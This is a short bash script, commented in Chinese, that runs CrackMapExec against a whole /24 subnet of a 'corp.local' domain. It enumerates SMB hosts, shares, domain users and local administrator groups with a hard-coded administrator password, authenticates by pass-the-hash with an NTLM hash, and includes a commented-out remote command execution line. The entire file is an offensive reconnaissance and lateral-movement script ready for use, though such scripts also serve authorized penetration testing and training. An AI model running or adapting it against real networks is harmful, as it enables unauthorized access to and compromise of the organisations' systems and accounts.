#!/bin/bash
# CrackMapExec SMB 枚举脚本

TARGET="192.168.1.0/24"
DOMAIN="corp.local"
USER="administrator"
PASS="Password123!"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] SMB 主机枚举"
crackmapexec smb ${TARGET}

echo "[*] 使用密码认证枚举共享"
crackmapexec smb ${TARGET} -u ${USER} -p ${PASS} --shares

echo "[*] 枚举域用户"
crackmapexec smb ${TARGET} -u ${USER} -p ${PASS} --users

echo "[*] 枚举本地管理员组"
crackmapexec smb ${TARGET} -u ${USER} -p ${PASS} --local-groups

echo "[*] 使用哈希 PTH 认证"
crackmapexec smb ${TARGET} -u ${USER} -H ${HASH}

echo "[*] 执行命令"
# crackmapexec smb ${TARGET} -u ${USER} -p ${PASS} -x "whoami /all"

echo "[*] 枚举完成"
